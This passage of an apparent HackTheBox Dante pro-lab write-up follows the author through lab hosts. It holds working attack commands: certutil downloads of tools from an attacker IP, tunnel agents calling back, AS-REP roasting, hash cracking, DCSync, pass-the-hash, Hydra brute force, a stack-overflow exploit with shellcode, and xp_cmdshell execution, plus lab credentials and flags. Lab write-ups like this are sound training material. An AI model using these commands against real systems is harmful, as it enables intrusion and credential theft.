040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Recent
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Saved Games
040555/r-xr-xr-x  4096     dir   2020-07-11 02:46:46 +0800  Searches
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  SendTo
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Start Menu
040777/rwxrwxrwx  0        dir   2020-06-10 19:36:41 +0800  Templates
040555/r-xr-xr-x  0        dir   2020-07-11 02:46:46 +0800  Videos
100666/rw-rw-rw-  95370    fil   2025-03-18 15:56:20 +0800  certenroll.log
100666/rw-rw-rw-  106496   fil   2020-06-10 19:36:41 +0800  ntuser.dat.LOG1
100666/rw-rw-rw-  28672    fil   2020-06-10 19:36:41 +0800  ntuser.dat.LOG2
100666/rw-rw-rw-  20       fil   2020-06-10 19:36:41 +0800  ntuser.ini
```

Get the flag in his `Desktop`

<figure><img src="../../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

13th flag: `DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}`

***

## <mark style="color:red;">mrb3n leaves his mark</mark>

Digging through the other stuff we can also notice `katwamba`'s SSH keys in his home directory. I downladed it just for fun

```
meterpreter > download id_rsa
```

Also an Excel sheet was in his Desktop

```
meterpreter > download employee_backup.xlsx
```

<figure><img src="../../../.gitbook/assets/image (56) (1).png" alt=""><figcaption></figcaption></figure>

Do some more digging we will find these and downloaded them as well:

<figure><img src="../../../.gitbook/assets/image (57) (1).png" alt=""><figcaption></figcaption></figure>

I used an online xlsx viewer to see the file

<figure><img src="../../../.gitbook/assets/image (58) (1).png" alt=""><figcaption></figcaption></figure>

We have a list of users and their credentials. Trying to SSH one by one would be pointless as I was denied entry

<figure><img src="../../../.gitbook/assets/image (60) (1).png" alt=""><figcaption></figcaption></figure>

I uploaded Winpeas to enumerate some more information. I uploaded it using `certutil` because Powershell was not working well. But first, drop into a shell

```
meterpreter > shell
certutil -urlcache -split -f http://10.10.14.4:8000/winPEASx64.exe winPEASx64.exe
```

Execute Winpeas

<figure><img src="../../../.gitbook/assets/image (66) (1).png" alt=""><figcaption></figcaption></figure>

From here, see the flag when enumerating `mrb3n`'s info

`mrb3n:S3kur1ty2020!`

14th flag: `DANTE{1_jusT_c@nt_st0p_d0ing_th1s}`

***

## <mark style="color:red;">It's getting hot in here</mark>

### 172.16.2.5 (DANTE-DC02)

This might be useful. I'm just storing everything I see hahah

<figure><img src="../../../.gitbook/assets/image (67) (1).png" alt=""><figcaption></figcaption></figure>

Weirdly enough `mrb3n` also couldn't login as SSH and had the same error lmao

<figure><img src="../../../.gitbook/assets/image (64) (1).png" alt=""><figcaption></figcaption></figure>

Check for internal hosts using `netstat:`

```
netstat -an | findstr "172.16."
```

<figure><img src="../../../.gitbook/assets/image (68) (1).png" alt=""><figcaption></figcaption></figure>

We can see here there is an internal host with the `172.16.2.5` IP ,which means we have to scan the whole subnet. Yay, more subnets (im dying).&#x20;

Because we are on a Domain Controller. I uploaded a `ligolo-ng` Windows agent to pivot to the internal host

<figure><img src="../../../.gitbook/assets/image (69) (1).png" alt=""><figcaption></figcaption></figure>

```
certutil -urlcache -split -f http://10.10.14.4:8000/windows-agent.exe windows-agent.exe
```

Execute the agent

```
windows-agent.exe -connect 10.10.14.4:8888 -ignore-cert
```

And we should receive a callback on the listener

<figure><img src="../../../.gitbook/assets/image (70) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (71) (1).png" alt=""><figcaption></figcaption></figure>

Add a new TUN interface on our machine&#x20;

```
sudo ip tuntap add user [your_username] mode tun ligolo-windows
sudo ip link set ligolo-windows up
```

Add the internal host to our route

```
sudo ip route add 172.16.2.0/24 dev ligolo-windows
```

Autoroute and use the interface we set up and start the tunnel

<figure><img src="../../../.gitbook/assets/image (72) (1).png" alt=""><figcaption></figcaption></figure>

Verify the tunnel worked by pinging the host

<figure><img src="../../../.gitbook/assets/image (73) (1).png" alt=""><figcaption></figcaption></figure>

Cool, now that it worked. Let's scan the whole subnet of the new host

```
nmap -sV -sC 172.16.2.0/24
```

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Unfortunaely, this did not work because somehow...the server blocks ICMP requests, even Rustscan didn't work... so I resolved to a Connect scan with the `-Pn` and with a faster rate of `-T4`

```
nmap -v -n 172.16.2.0/24 -Pn -T4
```

```
Nmap scan report for 172.16.2.0
Host is up.
All 1000 scanned ports on 172.16.2.0 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.1
Host is up.
All 1000 scanned ports on 172.16.2.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.2
Host is up.
All 1000 scanned ports on 172.16.2.2 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.3
Host is up.
All 1000 scanned ports on 172.16.2.3 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.4
Host is up.
All 1000 scanned ports on 172.16.2.4 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.5
Host is up (0.35s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap scan report for 172.16.2.6
Host is up.
All 1000 scanned ports on 172.16.2.6 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.7
Host is up.
All 1000 scanned ports on 172.16.2.7 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.8
Host is up.
All 1000 scanned ports on 172.16.2.8 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.9
Host is up.
All 1000 scanned ports on 172.16.2.9 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.10
Host is up.
All 1000 scanned ports on 172.16.2.10 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.11
Host is up.
All 1000 scanned ports on 172.16.2.11 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.12
Host is up.
All 1000 scanned ports on 172.16.2.12 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.13
Host is up.
All 1000 scanned ports on 172.16.2.13 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.14
Host is up.
All 1000 scanned ports on 172.16.2.14 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.15
Host is up.
All 1000 scanned ports on 172.16.2.15 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.16
Host is up.
All 1000 scanned ports on 172.16.2.16 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.17
Host is up.
All 1000 scanned ports on 172.16.2.17 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.18
Host is up.
All 1000 scanned ports on 172.16.2.18 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.19
Host is up.
All 1000 scanned ports on 172.16.2.19 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.20
Host is up.
All 1000 scanned ports on 172.16.2.20 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.21
Host is up.
All 1000 scanned ports on 172.16.2.21 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.22
Host is up.
All 1000 scanned ports on 172.16.2.22 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.23
Host is up.
All 1000 scanned ports on 172.16.2.23 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.24
Host is up.
All 1000 scanned ports on 172.16.2.24 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.25
Host is up.
All 1000 scanned ports on 172.16.2.25 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.26
Host is up.
All 1000 scanned ports on 172.16.2.26 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.27
Host is up.
All 1000 scanned ports on 172.16.2.27 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.28
Host is up.
All 1000 scanned ports on 172.16.2.28 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.29
Host is up.
All 1000 scanned ports on 172.16.2.29 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.30
Host is up.
All 1000 scanned ports on 172.16.2.30 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.31
Host is up.
All 1000 scanned ports on 172.16.2.31 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.32
Host is up.
All 1000 scanned ports on 172.16.2.32 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.33
Host is up.
All 1000 scanned ports on 172.16.2.33 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.34
Host is up.
All 1000 scanned ports on 172.16.2.34 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.35
Host is up.
All 1000 scanned ports on 172.16.2.35 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.36
Host is up.
All 1000 scanned ports on 172.16.2.36 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.37
Host is up.
All 1000 scanned ports on 172.16.2.37 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.38
Host is up.
All 1000 scanned ports on 172.16.2.38 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.39
Host is up.
All 1000 scanned ports on 172.16.2.39 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.40
Host is up.
All 1000 scanned ports on 172.16.2.40 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.41
Host is up.
All 1000 scanned ports on 172.16.2.41 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.42
Host is up.
All 1000 scanned ports on 172.16.2.42 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.43
Host is up.
All 1000 scanned ports on 172.16.2.43 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.44
Host is up.
All 1000 scanned ports on 172.16.2.44 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.45
Host is up.
All 1000 scanned ports on 172.16.2.45 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.46
Host is up.
All 1000 scanned ports on 172.16.2.46 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.47
Host is up.
All 1000 scanned ports on 172.16.2.47 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.48
Host is up.
All 1000 scanned ports on 172.16.2.48 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.49
Host is up.
All 1000 scanned ports on 172.16.2.49 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.50
Host is up.
All 1000 scanned ports on 172.16.2.50 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.51
Host is up.
All 1000 scanned ports on 172.16.2.51 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.52
Host is up.
All 1000 scanned ports on 172.16.2.52 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.53
Host is up.
All 1000 scanned ports on 172.16.2.53 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.54
Host is up.
All 1000 scanned ports on 172.16.2.54 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.55
Host is up.
All 1000 scanned ports on 172.16.2.55 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.56
Host is up.
All 1000 scanned ports on 172.16.2.56 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.57
Host is up.
All 1000 scanned ports on 172.16.2.57 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.58
Host is up.
All 1000 scanned ports on 172.16.2.58 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.59
Host is up.
All 1000 scanned ports on 172.16.2.59 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.60
Host is up.
All 1000 scanned ports on 172.16.2.60 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.61
Host is up.
All 1000 scanned ports on 172.16.2.61 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.62
Host is up.
All 1000 scanned ports on 172.16.2.62 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 172.16.2.63
Host is up.
All 1000 scanned ports on 172.16.2.63 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
```

Looks like we only have one subnet up. To inspect the services a little bit deeper, I ran a normal Service scan on the 172.16.2.5 subnet

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Okay finally, This took freaking 2 hours for me to get it right, I wanna punch a wall. Anyways, We can see here there is no HTTP for the first time only SMB, LDAP and Kerberos. This might be an Active Directory machine. Let's goooo.

Firstly enumerate SMB shares.

```
smbclient -L \\\\172.16.2.5\\
```

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

After that, I tried bruteforcing the users RID, but still have nothing

```
nxc smb 172.16.2.5 -u guest -p '' --rid-brute
```

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Now, let's try to enumerate users using `kerbrute`

```
./kerbrute userenum --dc 172.16.2.5 -d DANTE.ADMIN0 ~/HTB-Prolabs/users.txt
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

This however didn't work, so I tried adjusting the domain string to `DANTE`&#x20;

<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

And we have a hit on `jbercov@DANTE`

Now, we can test for common vulnerabilities like ASREProasting using Impacket's Get-NPUsers script

```
impacket-GetNPUsers DANTE/jbercov -no-pass -dc-ip 172.16.2.5
```

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

Nice! jbercov has pre-auth disabled which means we now have his Kerberos 5 AS-REP hash, we can save it in a file and attempt to crack it using hashcat

```
hashcat -a 0 -m 18200 jbercov.hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

Noice, now we have his password

`jbercov:myspace7`

We can log in to his account using `evil-winrm`

```
evil-winrm -i 172.16.2.5 -u jbercov -p "myspace7"
```

<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

Now, we can get the flag in his Desktop folder

15th flag: `DANTE{Im_too_hot_Im_K3rb3r045TinG!}`

***

## <mark style="color:red;">One misconfig to rule them all...</mark>

Now, like ususal let's upload winpeas on the target

<figure><img src="../../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

Unfortunately Winpeas will not show anything useful for AD that we can use for lateral movement and privilege escalation. What we can do now is upload Sharphound, which is a tool that collects info on the objects and relationships within the AD domain

{% embed url="https://github.com/SpecterOps/SharpHound" %}

Execute Sharphound with the following parameters

```powershell
SharpHound.exe --collectionmethods All
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

It will output a zip file containing multiple JSON files of the domain like GPOs, Users, Computers and OUs

What we can do with this zip file is ingest it in Bloodhound so we get a graph to map where we want to go and what we rights we have.&#x20;

{% embed url="https://github.com/SpecterOps/BloodHound" %}

The Sharphound data must be used with the modern version of Bloodhound CE, or otherwise it will not work

Now, let's spin up Bloodhound and upload the zip file

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Over here, we can see our compromised user, `jbercov`. Using Bloodhound, we can also see what group is he part of as we could inspect permissions.  This is a lateral movement technique called Permission Delegation.

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

So our goal here is to get `Administrator`. Let's look at the Pathfinding menu. Set the starting node as `jbercov` and the end node as `Administrator`.

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

So over here, we can notice that `jbercov` has DCsync and WriteGPLink rights to the domain. DCsync is a method of replicating the domain by simulating the DC to retrieve the password hashes. WriteGPLink is a bit complicated way to modify GPOs for privilege escalation.

The easiest method to exploit this would be using impacket's `secretsdump` to perform a DCsync attack

```
impacket-secretsdump -just-dc DANTE/jbercov@172.16.2.5
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Nice, we basically have full domain compromise with the dumped hashes. We can even forge Golden Tickets.

Now, log into Administrator using `evil-winrm` by passing the hash

```
evil-winrm -i 172.16.2.5 -u Administrator -H "4c827b7074e99eefd49d05872185f7f8"
```

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

Get the flag in Desktop folder

16th flag: `DANTE{DC_or_Marvel?}`

***

## <mark style="color:red;">My cup runneth over</mark>

### 176.16.2.101 (DANTE-ADMIN-NIX05)

There's a note in the same directory

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Huh... well guess I missed that one.

There was also a Jenkins.bat file in the Documents folder

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Then I remembered the Jetty login page where we were stuck before. Let's download the .bat file and head back to the website

After that was done, I did a check for additional host IP's and found nothing, which was weird because there were supposed to be more machines

```
netstat -an | findstr "172.16."
```

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

But I found an alternative which was to use this one liner ping sweep:

```
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
```

But the problem was, this can only be used in a CMD console and we have an `evil-winrm` session which was basically Powershell. So, I opted for using impacket's `psexec` which we would allow us to gain remote access on a CMD

This utility can also be used to pass hashes for authentications

```
impacket-psexec DANTE/Administrator@172.16.2.5 -hashes aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Great, now we can use that one liner ping sweep

```
(for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

As we can see there is an internal subnet replying. This is good but we have another problem, because the internal subnet can only be accessed through the DC01 machine, we need to pivot again and add a new route. So this is basically triple pivoting

But, for the route adding, we just need to add the specific IP and not the whole subnet because that is currently being used by another interface

```
sudo ip tuntap add user [username] mode tun DC02-pivot
sudo ip link set DC02-pivot up
sudo ip route add 172.16.2.101 dev DC02-pivot
```

Upload the agent on the DC02 machine and execute it like usual

```
windows-agent.exe -connect 10.10.14.4:8888 -ignore-cert
```

Check sessions on our proxy and start the route on the new interface

<figure><img src="../../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>

Ping to verify it worked

<figure><img src="../../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>

Nice, that worked. Now we can scan the host for open ports

```
nmap -v -Pn 172.16.2.101
```

<figure><img src="../../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

We see port `22` is open with SSH. It is kinda a bit sus to only have SSH open. We can attempt to brute-force this using Hydra using the credentials that we collected along the way

```
hydra -L users.txt -P passwords2.txt ssh://172.16.2.101
```

<figure><img src="../../../.gitbook/assets/image (808).png" alt=""><figcaption></figcaption></figure>

And let's go we have a hit on  `julian:manchesterunited`

Let's login to his user credentials

```
ssh julian@manchesterunited
```

<figure><img src="../../../.gitbook/assets/image (809).png" alt=""><figcaption></figcaption></figure>

Cool, we got in. Now let's run linpeas first and look for some stuff

<figure><img src="../../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>

Going through the results, we see an unknown SGID binary that we can execute

<figure><img src="../../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>

I attempted to read the root flag directly but that didn't work, also tried normal files like `/etc/passwd` and doesn't work

<figure><img src="../../../.gitbook/assets/image (812).png" alt=""><figcaption></figcaption></figure>

I downloaded the binary from the target to my machine for further analysis. We might have to do some reversing or some sort

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

Check the file type.

```
file readfile
```

<figure><img src="../../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>

Its a 64-bit file dynamically linked and not stripped. Great, the binary is not packed. We can perform full analysis

Now check for protections

```
checksec --file=readfile
```

<figure><img src="../../../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>

Some protections are disabled particularly NX, we may be able to exploit this. Let's further our analysis by using Ghidra

<figure><img src="../../../.gitbook/assets/image (818).png" alt=""><figcaption></figcaption></figure>

I already renamed some variables for better visibility. Essentially, what this code does is execute the the code as root (`setresuid(0, 0, 0,)`) and copying argument supplied to the buffer using `strcpy`

strcpy is a well-known vulnerable function to be used in this case because it does not check the size before being copied to the buffer. With NX disabled, we can place shellcode inside the stack pointer and get a shell as root!

First we need to check if ASLR is enabled on the target machine as this could hinder our exploitation.

```
cat /proc/sys/kernel/randomize_va_space
```

<figure><img src="../../../.gitbook/assets/image (819).png" alt=""><figcaption></figcaption></figure>

Nice, `0` means ASLR is completely disabled. By already having access to the system, we can attempt to exploit this locally, without the need to leak an address (which we have no way lol). This also renders PIE useless

Now we need to find the offset for the return address, I will be using my trusty `pwndbg`

```
gdb readfile
pwndbg> cyclic 100
pwndbg> r aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

<figure><img src="../../../.gitbook/assets/image (822).png" alt=""><figcaption></figcaption></figure>

The stack pointer is filled, find the return address using:

```
cyclic -l laaaaaaa
```

<figure><img src="../../../.gitbook/assets/image (823).png" alt=""><figcaption></figcaption></figure>

Cool, the offset is 88. To explain my full attempts would make this already long writeup even more long, but the way we can do this without an address leak is exporting the shellcode as a variable into the `env` section.

I referred to these blogs, it was very helpful

{% embed url="https://bitvijays.github.io/Series_Capture_The_Flag/LFC-BinaryExploitation.html#export-a-environment-variable" %}

{% embed url="https://medium.com/@danielorihuelarodriguez/store-shellcode-in-environment-variable-1058062b8b5e" %}

I tried testing this on my machine but it was useless, so I ended up doing it on the target machine itself lmao

Firstly, we export the shellcode variable using `python2`

```
export SHELLCODE=`python2 -c 'print "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"'`
```

Then we use this script from the blog to get the address of the `SHELLCODE` variable from `env`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
       char *ptr;

       if (argc < 3) {
              printf("Usage: %s <environment var> <target program name>\n", argv[0]);
              exit(0);
       } else {
               ptr = getenv(argv[1]); /* Get environment variable location */
               ptr += (strlen(argv[0]) - strlen(argv[2])) * 2; /* Adjust for program name */
               printf("%s will be at %p\n", argv[1], ptr);
       }
 }
```

Compile it and execute it with the following arguments

```
gcc env.c -o env
./env SHELLCODE /usr/sbin/readfile
```

<figure><img src="../../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>

Now that we have our address, attempt to execute the file using the original path with our `env` address as an argument in little-endian

```
/usr/sbin/readfile $(python2 -c 'print "A"*88+"\x7c\xe7\xff\xff\xff\x7f"')
```

<figure><img src="../../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

And boom we have a root shell! Let's upgrade our shell using `python3` and get the flag

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

flag: `DANTE{0verfl0wing_l1k3_craz33!}`

***

## <mark style="color:red;">It doesn't get any easier than this</mark>

### 172.16.2.6 (DANTE-ADMIN-NIX06)

Next, we need to look for more hosts inside. using linpeas output and `netstat` isn't going to be useful here. We will utilize this one liner here:

```
seq 1 254 | xargs -P 50 -I {} sh -c 'seq 1 254 | xargs -P 50 -I %% ping -c 1 -W 1 172.16.{}.%% | grep "64 bytes"'
```

<figure><img src="../../../.gitbook/assets/image (784).png" alt=""><figcaption></figcaption></figure>

We can see a new host which is `172.16.2.6`. It is clear that we cnanot ping this from the attacking machine. This means one thing. We need to pivot AGAIN. Holy shi\* bro

```
sudo ip tuntap add user mfkrypt mode tun NIX05-pivot
sudo ip link set NIX05-pivot up
sudo ip route add 172.16.2.6 dev NIX05-pivot
```

Autoroute in ligolo-proxy and start it. Let's scan the new host and find some open ports

```
nmap -v -Pn 172.16.2.6
```

<figure><img src="../../../.gitbook/assets/image (785).png" alt=""><figcaption></figcaption></figure>

We can see again SSH is the only one available, maybe we can bruteforce this again. Let's try it

```
hydra -L users.txt -P passwords2.txt ssh://172.16.2.6
```

<figure><img src="../../../.gitbook/assets/image (786).png" alt=""><figcaption></figcaption></figure>

This took a while as we are quadriple pivot bruteforcing but we have a hit on `plongbottom:PowerfixSaturdayClub777`

I wanted to run linpeas but for some reason I couldn't ping my attacking machine from the target so I had to manually search for stuff

I ran `sudo -l` to check for privileges

<figure><img src="../../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

Easy root, `plongbottom` can instantly become root with `sudo su`

<figure><img src="../../../.gitbook/assets/image (802).png" alt=""><figcaption></figcaption></figure>

Get the flag

flag:`DANTE{Alw4ys_check_th053_group5}`

***

## <mark style="color:red;">What do we have here?</mark>

When I was looking around I noticed julian also had a home directory on the internal host

<figure><img src="../../../.gitbook/assets/image (787).png" alt=""><figcaption></figcaption></figure>

I wanted to wait for the bruteforce to finish but it was so long, I tried to login to `julian` using the same credentials

`julian:manchesterunited`

<figure><img src="../../../.gitbook/assets/image (788).png" alt=""><figcaption></figcaption></figure>

And we got in, there is also a flag in there lmao

flag: `DANTE{H1ding_1n_th3_c0rner}`

***

## <mark style="color:red;">Fail 2: The Sequel</mark>

Inside the Desktop folder, there is a txt file named `SQL`

<figure><img src="../../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

Nice, we have a new credential `Sophie:TerrorInflictPurpleDirt996655`, let's add her to our growing wordlist. Now, if we remember in the initial progress there is a MSSQL service running on `172.16.1.5` that we left to move on. Let's head back there.

### 172.16.1.5 (DANTE-SQL01) - Part2 <a href="#id-172.16.1.5-windows-1-2" id="id-172.16.1.5-windows-1-2"></a>

We can authenticate using `nxc`

```
nxc mssql 172.16.1.5 -u Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth
```

<figure><img src="../../../.gitbook/assets/image (790).png" alt=""><figcaption></figcaption></figure>

Let's try to list available databases

```
nxc mssql 172.16.1.5 -u Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

<figure><img src="../../../.gitbook/assets/image (791).png" alt=""><figcaption></figcaption></figure>

Looks, like a few standard database nothing out of the ordinary. Using `nxc` we can also execute some Windows commands using the `xp_cmdshell` option

```
nxc mssql 172.16.1.5 -u sa Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth -x whoami
```

<figure><img src="../../../.gitbook/assets/image (792).png" alt=""><figcaption></figcaption></figure>

Nice, that worked. Let's try to list the available users in `C:\Users`

```
nxc mssql 172.16.1.5 -u sa Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth -x "dir C:\\Users"
```

<figure><img src="../../../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>

Cool, we have the flag. Attempt to read it

```
nxc mssql 172.16.1.5 -u sa Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth -x "type C:\\Users\flag.txt"
```

flag: `DANTE{Mult1ple_w4Ys_in!}`

***

## <mark style="color:red;">I prefer mine with skins on</mark>

Nice, after that I tried upload `nc.exe` on to it but it didnt work so I to dump the SQL hash using the `master` DB

```
nxc mssql 172.16.1.5 -u Sophie -p 'TerrorInflictPurpleDirt996655' --local-auth -q 'SELECT name, password_hash FROM master.sys.sql_logins;'
```

<figure><img src="../../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

